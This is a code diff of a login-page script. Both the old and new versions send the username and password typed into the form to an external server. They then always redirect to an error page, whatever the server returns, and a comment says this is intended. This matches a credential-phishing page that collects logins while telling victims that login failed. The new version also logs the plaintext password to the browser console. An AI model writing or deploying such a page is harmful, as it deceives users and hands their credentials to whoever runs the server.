@@ -1,31 +1,32 @@
-document.addEventListener("DOMContentLoaded", function () {
-    // Attach event listener to the login button
-    const loginButton = document.getElementById("loginBtn");
-    if (loginButton) {
-        loginButton.addEventListener("click", login);
-    }
-});
+document.getElementById("loginBtn").addEventListener("click", login);
 
 async function login() {
-    const username = document.getElementById("username").value.trim();
-    const password = document.getElementById("password").value.trim();
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
 
-    if (!username || !password) {
-        alert("Please enter both username and password.");
-        return;
-    }
+    console.log("Attempting login with:", username, password);
 
     try {
-        await fetch("https://backend-redf.onrender.com/login", {
+        const response = await fetch("https://backend-redf.onrender.com/login", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ username, password })
         });
 
-        // 🚨 Always redirect to error.html no matter what
+        console.log("Response status:", response.status);
+
+        if (!response.ok) {
+            throw new Error("Failed to login");
+        }
+
+        const responseData = await response.json();
+        console.log("Response data:", responseData);
+
+        // Always redirect to error.html
         window.location.href = "error.html";
+
     } catch (error) {
-        console.error("Error:", error);
-        window.location.href = "error.html"; // Redirect on error as well
+        console.error("Fetch Error:", error);
+        alert("Something went wrong!");
     }
 }
